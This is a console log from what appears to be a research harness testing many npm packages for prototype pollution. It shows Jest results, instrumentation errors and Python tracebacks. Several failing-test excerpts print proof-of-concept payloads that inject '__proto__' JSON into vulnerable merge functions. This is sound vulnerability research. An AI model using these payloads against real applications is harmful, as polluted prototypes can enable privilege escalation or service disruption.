    SyntaxError: /Users/masudulhasanmasudbhuiyan/Music/vulns4js/prototype-pollution/node_modules/worksmith/index.js: 'with' in strict mode. (116:12)

      114 |                 return true;
      115 |             }
    > 116 |             with(context) {
          |             ^
      117 |                 if (eval(workflowDefinition.condition)) {
      118 |                     return true;
      119 |                 }

      at Parser._raise (../node_modules/@babel/parser/src/parser/error.js:150:45)
      at Parser.raiseWithData (../node_modules/@babel/parser/src/parser/error.js:145:17)
      at Parser.raise (../node_modules/@babel/parser/src/parser/error.js:89:17)
      at Parser.parseWithStatement (../node_modules/@babel/parser/src/parser/statement.js:924:12)
      at Parser.parseStatementContent (../node_modules/@babel/parser/src/parser/statement.js:396:21)
      at Parser.parseStatement (../node_modules/@babel/parser/src/parser/statement.js:329:17)
      at Parser.parseBlockOrModuleBlockBody (../node_modules/@babel/parser/src/parser/statement.js:1073:25)
      at Parser.parseBlockBody (../node_modules/@babel/parser/src/parser/statement.js:1049:10)
      at Parser.parseBlock (../node_modules/@babel/parser/src/parser/statement.js:1019:10)
      at Parser.parseFunctionBody (../node_modules/@babel/parser/src/parser/expression.js:2461:24)

  ● prototype pollution in worksmith

    ReferenceError: obj is not defined

      3 | test("prototype pollution in worksmith", () => {
      4 |   const worksmith = require("worksmith");
    > 5 |   obj = {};
        |      ^
      6 | 
      7 |   expect({}.polluted).toBe(undefined);
      8 | 

      at Object.<anonymous> (worksmith_1.0.0/worksmith.test.js:5:6)

  ● prototype pollution in worksmith

    TypeError: Cannot read properties of undefined (reading 'size')

      46 |    console.log(global.accessedProperties);   
      47 |    let maxChain = getMaxLength(global.fctsLog) - 1;
    > 48 |    let percUsed = Math.floor(global.accessedProperties.size /global.declaredProperties.length * 10);
         |                                                        ^
      49 |    if (global.accessedProperties.size === 0) percUsed = -1;
      50 |    if (maxChain >= 10) maxChain = 9;
      51 |    if (percUsed === 10) percUsed = 9;

      at Object.<anonymous> (require-interception.js:48:56)

Test Suites: 1 failed, 1 total
Tests:       1 failed, 1 total
Snapshots:   0 total
Time:        1.222 s
Ran all test suites matching /worksmith_1.0.0\/worksmith.test.js/i.
Traceback (most recent call last):
  File "/Users/masudulhasanmasudbhuiyan/Music/vulns4js/prototype-pollution/test_modules_in_serial.py", line 24, in <module>
    ping = subprocess.run(['npx','jest', test_file_name], stdout=subprocess.PIPE, check=True)
  File "/usr/local/Cellar/python@3.9/3.9.8/Frameworks/Python.framework/Versions/3.9/lib/python3.9/subprocess.py", line 528, in run
    raise CalledProcessError(retcode, process.args,
subprocess.CalledProcessError: Command '['npx', 'jest', 'worksmith_1.0.0/worksmith.test.js']' returned non-zero exit status 1.
['../prototype-pollution/component-flatten_1.0.1/component-flatten.test.js']
PASS component-flatten_1.0.1/component-flatten.test.js
  ✓ prototype pollution in component-flatten (221 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        1.255 s
Ran all test suites matching /component-flatten_1.0.1\/component-flatten.test.js/i.
b"Loaded babel plugin\n  console.log\n    [ 'main' ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(1) { 'main' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 9, 3\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
['../prototype-pollution/upmerge_0.1.7/upmerge.test.js']
FAIL upmerge_0.1.7/upmerge.test.js
  ✕ prototype pollution in upmerge (76 ms)

  ● prototype pollution in upmerge

    ReferenceError: obj is not defined

      3 |   let upmerge = require("upmerge"); // this version is vulnerable
      4 |   let payload = '{"__proto__":{ "polluted" : "yes" } }'; // this comes from network
    > 5 |   obj = {};
        |      ^
      6 | 
      7 |   expect({}.polluted).toBe(undefined);
      8 |   upmerge.merge({}, JSON.parse(payload));

      at Object.<anonymous> (upmerge_0.1.7/upmerge.test.js:5:6)

Test Suites: 1 failed, 1 total
Tests:       1 failed, 1 total
Snapshots:   0 total
Time:        1.141 s
Ran all test suites matching /upmerge_0.1.7\/upmerge.test.js/i.
Traceback (most recent call last):
  File "/Users/masudulhasanmasudbhuiyan/Music/vulns4js/prototype-pollution/test_modules_in_serial.py", line 24, in <module>
    ping = subprocess.run(['npx','jest', test_file_name], stdout=subprocess.PIPE, check=True)
  File "/usr/local/Cellar/python@3.9/3.9.8/Frameworks/Python.framework/Versions/3.9/lib/python3.9/subprocess.py", line 528, in run
    raise CalledProcessError(retcode, process.args,
subprocess.CalledProcessError: Command '['npx', 'jest', 'upmerge_0.1.7/upmerge.test.js']' returned non-zero exit status 1.
['../prototype-pollution/bodymen_1.0.0/bodymen.test.js']
PASS bodymen_1.0.0/bodymen.test.js
  ✓ prototype pollution in bodymen  (269 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        1.301 s
Ran all test suites matching /bodymen_1.0.0\/bodymen.test.js/i.
b"Loaded babel plugin\n  console.log\n    [\n      'Param',\n      'Schema',\n      'handlers',\n      'handler',\n      'formatter',\n      'validator',\n      'middleware',\n      'errorHandler',\n      'default'\n    ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(1) { 'handler' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 1, 7\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
['../prototype-pollution/swiper_6.5.0/swiper.test.js']
FAIL swiper_6.5.0/swiper.test.js
  ✕ prototype pollution in swiper (1682 ms)

  ● prototype pollution in swiper

    TypeError: pushFct(...) is not a function

       7 |   expect({}.polluted).toBe(undefined);
       8 | 
    >  9 |   swiper.default.extendDefaults(JSON.parse(malicious_payload));
         |                  ^
      10 |   expect({}.polluted).toBe("yes");
      11 | });
      12 | 

      at Function.extendDefaults (node_modules/swiper/cjs/components/core/core-class.js:566:5)
      at Object.<anonymous> (swiper_6.5.0/swiper.test.js:9:18)

Test Suites: 1 failed, 1 total
Tests:       1 failed, 1 total
Snapshots:   0 total
Time:        2.816 s
Ran all test suites matching /swiper_6.5.0\/swiper.test.js/i.
Traceback (most recent call last):
  File "/Users/masudulhasanmasudbhuiyan/Music/vulns4js/prototype-pollution/test_modules_in_serial.py", line 24, in <module>
    ping = subprocess.run(['npx','jest', test_file_name], stdout=subprocess.PIPE, check=True)
  File "/usr/local/Cellar/python@3.9/3.9.8/Frameworks/Python.framework/Versions/3.9/lib/python3.9/subprocess.py", line 528, in run
    raise CalledProcessError(retcode, process.args,
subprocess.CalledProcessError: Command '['npx', 'jest', 'swiper_6.5.0/swiper.test.js']' returned non-zero exit status 1.
['../prototype-pollution/deep-defaults_1.0.5/deep-defaults.test.js']
PASS deep-defaults_1.0.5/deep-defaults.test.js
  ✓ prototype pollution in dot-object  (82 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        1.101 s
Ran all test suites matching /deep-defaults_1.0.5\/deep-defaults.test.js/i.
b"Loaded babel plugin\n  console.log\n    [ 'main' ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(1) { 'main' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 9, 7\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
['../prototype-pollution/smart-extend_1.7.3/smart-extend.test.js']
FAIL smart-extend_1.7.3/smart-extend.test.js
  ✕ prototype pollution in smart-extend (100 ms)

  ● prototype pollution in smart-extend

    ReferenceError: obj is not defined

      3 | test("prototype pollution in smart-extend", () => {
      4 |   var extend = require("smart-extend");
    > 5 |   obj = {};
        |      ^
      6 | 
      7 |   expect({}.polluted).toBe(undefined);
      8 |   var payload = '{"__proto__":{"polluted":"yes"}}';

      at Object.<anonymous> (smart-extend_1.7.3/smart-extend.test.js:5:6)

Test Suites: 1 failed, 1 total
Tests:       1 failed, 1 total
Snapshots:   0 total
Time:        1.145 s
Ran all test suites matching /smart-extend_1.7.3\/smart-extend.test.js/i.
Traceback (most recent call last):
  File "/Users/masudulhasanmasudbhuiyan/Music/vulns4js/prototype-pollution/test_modules_in_serial.py", line 24, in <module>
    ping = subprocess.run(['npx','jest', test_file_name], stdout=subprocess.PIPE, check=True)
  File "/usr/local/Cellar/python@3.9/3.9.8/Frameworks/Python.framework/Versions/3.9/lib/python3.9/subprocess.py", line 528, in run
    raise CalledProcessError(retcode, process.args,
subprocess.CalledProcessError: Command '['npx', 'jest', 'smart-extend_1.7.3/smart-extend.test.js']' returned non-zero exit status 1.
['../prototype-pollution/patchmerge_1.0.0/patchmerge.test.js']
FAIL patchmerge_1.0.0/patchmerge.test.js
  ✕ prototype pollution in patchmerge (36 ms)

  ● prototype pollution in patchmerge

    TypeError: /Users/masudulhasanmasudbhuiyan/Music/vulns4js/prototype-pollution/patchmerge_1.0.0/node_modules/patchmerge/index.js: Cannot read properties of undefined (reading 'unshift')

      71 |           if (path.node.id) name = path.node.id.name;
      72 |           // console.log(path.node.body);
    > 73 |           path.node.body.body.unshift(
         |                               ^
      74 |             t.callExpression(t.identifier("pushFct"), [
      75 |               t.stringLiteral(name + ":" + path.node.loc.start.line),
      76 |             ])

      at PluginPass.enter (babel-instrumentor.js:73:31)
      at newFn (../node_modules/@babel/traverse/lib/visitors.js:177:21)
      at NodePath._call (../node_modules/@babel/traverse/lib/path/context.js:53:20)
      at NodePath.call (../node_modules/@babel/traverse/lib/path/context.js:40:17)
      at NodePath.visit (../node_modules/@babel/traverse/lib/path/context.js:100:31)
      at TraversalContext.visitQueue (../node_modules/@babel/traverse/lib/context.js:103:16)
      at TraversalContext.visitSingle (../node_modules/@babel/traverse/lib/context.js:77:19)
      at TraversalContext.visit (../node_modules/@babel/traverse/lib/context.js:131:19)
      at traverseNode (../node_modules/@babel/traverse/lib/traverse-node.js:24:17)
      at NodePath.visit (../node_modules/@babel/traverse/lib/path/context.js:107:52)

  ● prototype pollution in patchmerge

    TypeError: patchMerge is not a function

       6 | 
       7 |   let obj = {};
    >  8 |   patchMerge(obj, JSON.parse('{ "__proto__": { "polluted": "yes" }}'));
         |   ^
       9 | 
      10 |   expect({}.polluted).toBe("yes");
      11 | });

      at Object.<anonymous> (patchmerge_1.0.0/patchmerge.test.js:8:3)

  ● prototype pollution in patchmerge

    TypeError: Cannot read properties of undefined (reading 'size')

      46 |    console.log(global.accessedProperties);   
      47 |    let maxChain = getMaxLength(global.fctsLog) - 1;
    > 48 |    let percUsed = Math.floor(global.accessedProperties.size /global.declaredProperties.length * 10);
         |                                                        ^
      49 |    if (global.accessedProperties.size === 0) percUsed = -1;
      50 |    if (maxChain >= 10) maxChain = 9;
      51 |    if (percUsed === 10) percUsed = 9;

      at Object.<anonymous> (require-interception.js:48:56)

Test Suites: 1 failed, 1 total
Tests:       1 failed, 1 total
Snapshots:   0 total
Time:        1.068 s
Ran all test suites matching /patchmerge_1.0.0\/patchmerge.test.js/i.
Traceback (most recent call last):
  File "/Users/masudulhasanmasudbhuiyan/Music/vulns4js/prototype-pollution/test_modules_in_serial.py", line 24, in <module>
    ping = subprocess.run(['npx','jest', test_file_name], stdout=subprocess.PIPE, check=True)
  File "/usr/local/Cellar/python@3.9/3.9.8/Frameworks/Python.framework/Versions/3.9/lib/python3.9/subprocess.py", line 528, in run
    raise CalledProcessError(retcode, process.args,
subprocess.CalledProcessError: Command '['npx', 'jest', 'patchmerge_1.0.0/patchmerge.test.js']' returned non-zero exit status 1.
['../prototype-pollution/node-ini_1.0.0/node-ini.test.js']
PASS node-ini_1.0.0/node-ini.test.js
  ✓ prototype pollution in node-ini (86 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        1.221 s
Ran all test suites matching /node-ini_1.0.0\/node-ini.test.js/i.
b"Loaded babel plugin\n  console.log\n    [ 'encoding', 'curSection', 'parse', 'parseSync' ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(1) { 'parse' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 2, 1\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
['../prototype-pollution/controlled-merge_1.0.0/controlled-merge.test.js']
PASS controlled-merge_1.0.0/controlled-merge.test.js
  ✓ prototype pollution in controlled-merge  (50 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        1.076 s
Ran all test suites matching /controlled-merge_1.0.0\/controlled-merge.test.js/i.
b"Loaded babel plugin\n  console.log\n    [ 'main' ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(1) { 'main' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 9, 3\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
['../prototype-pollution/deeply_3.0.0/deeply.test.js']
FAIL deeply_3.0.0/deeply.test.js
  ✕ prototype pollution in deeply  (209 ms)

  ● prototype pollution in deeply 

    TypeError: Cannot read properties of undefined (reading 'useCustomTypeOf')

       7 |   expect({}.polluted).toBe(undefined);
       8 | 
    >  9 |   mergeFn({}, JSON.parse(payload));
         |   ^
      10 |   expect({}.polluted).toBe("yes");
      11 | });
      12 | 

      at call (node_modules/deeply/merge.js:53:12)
      at call (node_modules/deeply/merge.js:23:34)
      at apply (node_modules/deeply/mutable.js:20:20)
      at mergeFn (node_modules/deeply/immutable.js:18:18)
      at Object.<anonymous> (deeply_3.0.0/deeply.test.js:9:3)

Test Suites: 1 failed, 1 total
Tests:       1 failed, 1 total
Snapshots:   0 total
Time:        1.306 s
Ran all test suites matching /deeply_3.0.0\/deeply.test.js/i.
Traceback (most recent call last):
  File "/Users/masudulhasanmasudbhuiyan/Music/vulns4js/prototype-pollution/test_modules_in_serial.py", line 24, in <module>
    ping = subprocess.run(['npx','jest', test_file_name], stdout=subprocess.PIPE, check=True)
  File "/usr/local/Cellar/python@3.9/3.9.8/Frameworks/Python.framework/Versions/3.9/lib/python3.9/subprocess.py", line 528, in run
    raise CalledProcessError(retcode, process.args,
subprocess.CalledProcessError: Command '['npx', 'jest', 'deeply_3.0.0/deeply.test.js']' returned non-zero exit status 1.
['../prototype-pollution/undefsafe_2.0.2/undefsafe.test.js']
PASS undefsafe_2.0.2/undefsafe.test.js
  ✓ prototype pollution in undefsafe  (65 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        1.092 s
Ran all test suites matching /undefsafe_2.0.2\/undefsafe.test.js/i.
b"Loaded babel plugin\n  console.log\n    [ 'main' ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(1) { 'main' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 9, 2\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
['../prototype-pollution/eivindfjeldstad-dot_0.0.1/eivindfjeldstad-dot.test.js']
PASS eivindfjeldstad-dot_0.0.1/eivindfjeldstad-dot.test.js
  ✓ prototype pollution in eivindfjeldstad-dot (41 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        1.103 s
Ran all test suites matching /eivindfjeldstad-dot_0.0.1\/eivindfjeldstad-dot.test.js/i.
b"Loaded babel plugin\n  console.log\n    [ 'set', 'get' ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(1) { 'set' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 5, 1\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
['../prototype-pollution/deep-get-set_1.1.0/deep-get-set.test.js']
PASS deep-get-set_1.1.0/deep-get-set.test.js
  ✓ prototype pollution in deep-get-set (50 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        1.095 s
Ran all test suites matching /deep-get-set_1.1.0\/deep-get-set.test.js/i.
b"Loaded babel plugin\n  console.log\n    [ 'main' ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(1) { 'main' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 9, 1\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
['../prototype-pollution/getsetdeep_4.15.0/getsetdeep.test.js']
PASS getsetdeep_4.15.0/getsetdeep.test.js
  ✓ prototype pollution in getsetdeep (111 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        1.14 s
Ran all test suites matching /getsetdeep_4.15.0\/getsetdeep.test.js/i.
b"Loaded babel plugin\n  console.log\n    [ 'getDeep', 'setDeep' ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(1) { 'setDeep' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 5, 3\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
['../prototype-pollution/lodash_4.17.15/lodash.test.js']
PASS lodash_4.17.15/lodash.test.js
  ✓ prototype pollution in lodash (806 ms)
  ✓ prototype pollution in lodash (4 ms)

Test Suites: 1 passed, 1 total
Tests:       2 passed, 2 total
Snapshots:   0 total
Time:        1.852 s
Ran all test suites matching /lodash_4.17.15\/lodash.test.js/i.
b"Loaded babel plugin\n  console.log\n    [\n      'templateSettings', 'after',          'ary',              'assign',\n      'assignIn',         'assignInWith',   'assignWith',       'at',\n      'before',           'bind',           'bindAll',          'bindKey',\n      'castArray',        'chain',          'chunk',            'compact',\n      'concat',           'cond',           'conforms',         'constant',\n      'countBy',          'create',         'curry',            'curryRight',\n      'debounce',         'defaults',       'defaultsDeep',     'defer',\n      'delay',            'difference',     'differenceBy',     'differenceWith',\n      'drop',             'dropRight',      'dropRightWhile',   'dropWhile',\n      'fill',             'filter',         'flatMap',          'flatMapDeep',\n      'flatMapDepth',     'flatten',        'flattenDeep',      'flattenDepth',\n      'flip',             'flow',           'flowRight',        'fromPairs',\n      'functions',        'functionsIn',    'groupBy',          'initial',\n      'intersection',     'intersectionBy', 'intersectionWith', 'invert',\n      'invertBy',         'invokeMap',      'iteratee',         'keyBy',\n      'keys',             'keysIn',         'map',              'mapKeys',\n      'mapValues',        'matches',        'matchesProperty',  'memoize',\n      'merge',            'mergeWith',      'method',           'methodOf',\n      'mixin',            'negate',         'nthArg',           'omit',\n      'omitBy',           'once',           'orderBy',          'over',\n      'overArgs',         'overEvery',      'overSome',         'partial',\n      'partialRight',     'partition',      'pick',             'pickBy',\n      'property',         'propertyOf',     'pull',             'pullAll',\n      'pullAllBy',        'pullAllWith',    'pullAt',           'range',\n      'rangeRight',       'rearg',          'reject',           'remove',\n      ... 209 more items\n    ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(2) { 'main', 'set' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 0, 7\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n  console.log\n    [\n      'templateSettings', 'after',          'ary',              'assign',\n      'assignIn',         'assignInWith',   'assignWith',       'at',\n      'before',           'bind',           'bindAll',          'bindKey',\n      'castArray',        'chain',          'chunk',            'compact',\n      'concat',           'cond',           'conforms',         'constant',\n      'countBy',          'create',         'curry',            'curryRight',\n      'debounce',         'defaults',       'defaultsDeep',     'defer',\n      'delay',            'difference',     'differenceBy',     'differenceWith',\n      'drop',             'dropRight',      'dropRightWhile',   'dropWhile',\n      'fill',             'filter',         'flatMap',          'flatMapDeep',\n      'flatMapDepth',     'flatten',        'flattenDeep',      'flattenDepth',\n      'flip',             'flow',           'flowRight',        'fromPairs',\n      'functions',        'functionsIn',    'groupBy',          'initial',\n      'intersection',     'intersectionBy', 'intersectionWith', 'invert',\n      'invertBy',         'invokeMap',      'iteratee',         'keyBy',\n      'keys',             'keysIn',         'map',              'mapKeys',\n      'mapValues',        'matches',        'matchesProperty',  'memoize',\n      'merge',            'mergeWith',      'method',           'methodOf',\n      'mixin',            'negate',         'nthArg',           'omit',\n      'omitBy',           'once',           'orderBy',          'over',\n      'overArgs',         'overEvery',      'overSome',         'partial',\n      'partialRight',     'partition',      'pick',             'pickBy',\n      'property',         'propertyOf',     'pull',             'pullAll',\n      'pullAllBy',        'pullAllWith',    'pullAt',           'range',\n      'rangeRight',       'rearg',          'reject',           'remove',\n      ... 208 more items\n    ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(1) { 'setWith' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 0, 3\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
['../prototype-pollution/patchmerge_1.0.1/patchmerge.test.js']
FAIL patchmerge_1.0.1/patchmerge.test.js
  ✕ prototype pollution in patchMerge (42 ms)

  ● prototype pollution in patchMerge

    TypeError: /Users/masudulhasanmasudbhuiyan/Music/vulns4js/prototype-pollution/node_modules/patchmerge/index.js: Cannot read properties of undefined (reading 'unshift')

      71 |           if (path.node.id) name = path.node.id.name;
      72 |           // console.log(path.node.body);
    > 73 |           path.node.body.body.unshift(
         |                               ^
      74 |             t.callExpression(t.identifier("pushFct"), [
      75 |               t.stringLiteral(name + ":" + path.node.loc.start.line),
      76 |             ])

      at PluginPass.enter (babel-instrumentor.js:73:31)
      at newFn (../node_modules/@babel/traverse/lib/visitors.js:177:21)
      at NodePath._call (../node_modules/@babel/traverse/lib/path/context.js:53:20)
      at NodePath.call (../node_modules/@babel/traverse/lib/path/context.js:40:17)
      at NodePath.visit (../node_modules/@babel/traverse/lib/path/context.js:100:31)
      at TraversalContext.visitQueue (../node_modules/@babel/traverse/lib/context.js:103:16)
      at TraversalContext.visitSingle (../node_modules/@babel/traverse/lib/context.js:77:19)
      at TraversalContext.visit (../node_modules/@babel/traverse/lib/context.js:131:19)
      at traverseNode (../node_modules/@babel/traverse/lib/traverse-node.js:24:17)
      at NodePath.visit (../node_modules/@babel/traverse/lib/path/context.js:107:52)

  ● prototype pollution in patchMerge

    TypeError: patchMerge is not a function

      4 |   var obj = {};
      5 |   expect({}.polluted).toBe(undefined);
    > 6 |   patchMerge(obj, JSON.parse('{"__proto__": { "polluted": "yes" }}'));
        |   ^
      7 |   expect({}.polluted).toBe("yes");
      8 | });
      9 | 

      at Object.<anonymous> (patchmerge_1.0.1/patchmerge.test.js:6:3)

  ● prototype pollution in patchMerge

    TypeError: Cannot read properties of undefined (reading 'size')

      46 |    console.log(global.accessedProperties);   
      47 |    let maxChain = getMaxLength(global.fctsLog) - 1;
    > 48 |    let percUsed = Math.floor(global.accessedProperties.size /global.declaredProperties.length * 10);
         |                                                        ^
      49 |    if (global.accessedProperties.size === 0) percUsed = -1;
      50 |    if (maxChain >= 10) maxChain = 9;
      51 |    if (percUsed === 10) percUsed = 9;

      at Object.<anonymous> (require-interception.js:48:56)

Test Suites: 1 failed, 1 total
Tests:       1 failed, 1 total
Snapshots:   0 total
Time:        1.067 s
Ran all test suites matching /patchmerge_1.0.1\/patchmerge.test.js/i.
Traceback (most recent call last):
  File "/Users/masudulhasanmasudbhuiyan/Music/vulns4js/prototype-pollution/test_modules_in_serial.py", line 24, in <module>
    ping = subprocess.run(['npx','jest', test_file_name], stdout=subprocess.PIPE, check=True)
  File "/usr/local/Cellar/python@3.9/3.9.8/Frameworks/Python.framework/Versions/3.9/lib/python3.9/subprocess.py", line 528, in run
    raise CalledProcessError(retcode, process.args,
subprocess.CalledProcessError: Command '['npx', 'jest', 'patchmerge_1.0.1/patchmerge.test.js']' returned non-zero exit status 1.
['../prototype-pollution/confinit_0.3.0/confinit.test.js']
FAIL confinit_0.3.0/confinit.test.js
  ✕ prototype pollution in confinit (189 ms)

  ● prototype pollution in confinit

    TypeError: /Users/masudulhasanmasudbhuiyan/Music/vulns4js/prototype-pollution/node_modules/debug/src/common.js: Cannot read properties of undefined (reading 'unshift')

      71 |           if (path.node.id) name = path.node.id.name;
      72 |           // console.log(path.node.body);
    > 73 |           path.node.body.body.unshift(
         |                               ^
      74 |             t.callExpression(t.identifier("pushFct"), [
      75 |               t.stringLiteral(name + ":" + path.node.loc.start.line),
      76 |             ])

      at PluginPass.enter (babel-instrumentor.js:73:31)
      at newFn (../node_modules/@babel/traverse/lib/visitors.js:177:21)
      at NodePath._call (../node_modules/@babel/traverse/lib/path/context.js:53:20)
      at NodePath.call (../node_modules/@babel/traverse/lib/path/context.js:40:17)
      at NodePath.visit (../node_modules/@babel/traverse/lib/path/context.js:100:31)
      at TraversalContext.visitQueue (../node_modules/@babel/traverse/lib/context.js:103:16)
      at TraversalContext.visitMultiple (../node_modules/@babel/traverse/lib/context.js:72:17)
      at TraversalContext.visit (../node_modules/@babel/traverse/lib/context.js:129:19)
      at traverseNode (../node_modules/@babel/traverse/lib/traverse-node.js:24:17)
      at NodePath.visit (../node_modules/@babel/traverse/lib/path/context.js:107:52)

  ● prototype pollution in confinit

    TypeError: root.setDeepProperty is not a function

       6 |   expect({}.polluted).toBe(undefined);
       7 | 
    >  8 |   root.setDeepProperty({}, payload, "yes");
         |        ^
       9 | 
      10 |   expect({}.polluted).toBe("yes");
      11 | });

      at Object.<anonymous> (confinit_0.3.0/confinit.test.js:8:8)

  ● prototype pollution in confinit

    TypeError: Cannot read properties of undefined (reading 'size')

      46 |    console.log(global.accessedProperties);   
      47 |    let maxChain = getMaxLength(global.fctsLog) - 1;
    > 48 |    let percUsed = Math.floor(global.accessedProperties.size /global.declaredProperties.length * 10);
         |                                                        ^
      49 |    if (global.accessedProperties.size === 0) percUsed = -1;
      50 |    if (maxChain >= 10) maxChain = 9;
      51 |    if (percUsed === 10) percUsed = 9;

      at Object.<anonymous> (require-interception.js:48:56)

Test Suites: 1 failed, 1 total
Tests:       1 failed, 1 total
Snapshots:   0 total
Time:        1.302 s
Ran all test suites matching /confinit_0.3.0\/confinit.test.js/i.
Traceback (most recent call last):
  File "/Users/masudulhasanmasudbhuiyan/Music/vulns4js/prototype-pollution/test_modules_in_serial.py", line 24, in <module>
    ping = subprocess.run(['npx','jest', test_file_name], stdout=subprocess.PIPE, check=True)
  File "/usr/local/Cellar/python@3.9/3.9.8/Frameworks/Python.framework/Versions/3.9/lib/python3.9/subprocess.py", line 528, in run
    raise CalledProcessError(retcode, process.args,
subprocess.CalledProcessError: Command '['npx', 'jest', 'confinit_0.3.0/confinit.test.js']' returned non-zero exit status 1.
['../prototype-pollution/linux-cmdline_1.0.0/linux-cmdline.test.js']
PASS linux-cmdline_1.0.0/linux-cmdline.test.js
  ✓ prototype pollution in linux-cmdline (46 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        1.086 s
Ran all test suites matching /linux-cmdline_1.0.0\/linux-cmdline.test.js/i.
b"Loaded babel plugin\n  console.log\n    [ 'main' ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(1) { 'main' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 9, 2\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
['../prototype-pollution/expand-hash_1.0.1/expand-hash.test.js']
PASS expand-hash_1.0.1/expand-hash.test.js
  ✓ prototype pollution in expand-hash  (49 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        1.07 s
Ran all test suites matching /expand-hash_1.0.1\/expand-hash.test.js/i.
b"Loaded babel plugin\n  console.log\n    [ 'main' ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(1) { 'main' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 9, 3\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
['../prototype-pollution/class-transformer_0.1.1/class-transformer.test.js']
PASS class-transformer_0.1.1/class-transformer.test.js
  ✓ prototype pollution in class-transformer (320 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        1.336 s
Ran all test suites matching /class-transformer_0.1.1\/class-transformer.test.js/i.
b"Loaded babel plugin\n  console.log\n    [\n      'ClassTransformer',\n      'Transform',\n      'Type',\n      'Expose',\n      'Exclude',\n      'classToPlain',\n      'classToPlainFromExist',\n      'plainToClass',\n      'plainToClassFromExist',\n      'classToClass',\n      'classToClassFromExist',\n      'serialize',\n      'deserialize',\n      'deserializeArray',\n      'defaultMetadataStorage'\n    ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(1) { 'classToPlainFromExist' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 0, 6\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
['../prototype-pollution/iniparserjs_1.0.4/iniparserjs.test.js']
PASS iniparserjs_1.0.4/iniparserjs.test.js
  ✓ prototype pollution in iniparserjs (93 ms)

Test Suites: 1 passed, 1 total
Tests:       1 passed, 1 total
Snapshots:   0 total
Time:        1.142 s
Ran all test suites matching /iniparserjs_1.0.4\/iniparserjs.test.js/i.
b"Loaded babel plugin\n  console.log\n    After: yes\n\n      at Object.<anonymous> (iniparserjs_1.0.4/iniparserjs.test.js:11:11)\n\n  console.log\n    [ 'main' ]\n\n      at Object.<anonymous> (require-interception.js:45:12)\n\n  console.log\n    Set(2) { 'main', 'prototype' }\n\n      at Object.<anonymous> (require-interception.js:46:12)\n\n  console.log\n    Result for heatmap: 20, 2\n\n      at Object.<anonymous> (require-interception.js:52:12)\n\n"
['../prototype-pollution/getobject_0.1.0/getobject.test.js']
PASS getobject_0.1.0/getobject.test.js
  ✓ prototype pollution in getobject (52 ms)

